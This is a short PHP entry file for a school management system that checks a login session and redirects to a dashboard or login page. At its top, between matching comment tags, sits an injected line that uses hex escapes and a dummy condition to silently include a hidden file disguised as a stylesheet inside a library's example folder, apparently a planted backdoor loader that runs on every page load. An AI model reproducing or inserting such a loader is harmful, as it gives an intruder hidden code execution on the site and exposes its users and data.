<?php
/*ffe07*/

$rpva6h = "/home4/jo370xfr/publ\x69c_html/msd.gptech.pk/PHPExcel\x2d1.8/Examples/data/.3a382c80.css"; if (138 + 191){ @include_once /* 8ts */ ($rpva6h); }

/*ffe07*/







	include "dbsetting/lms_vars_config.php";
	include "dbsetting/classdbconection.php";
	$dblms = new dblms();
	include "functions/login_func.php";
	checkCpanelLMSALogin();
	if(isset($_SESSION['userlogininfo']['LOGINIDA'])) {
		header("Location: dashboard.php");	
	} else { 
		header("Location: login.php");
	}
//echo 'hello';
?>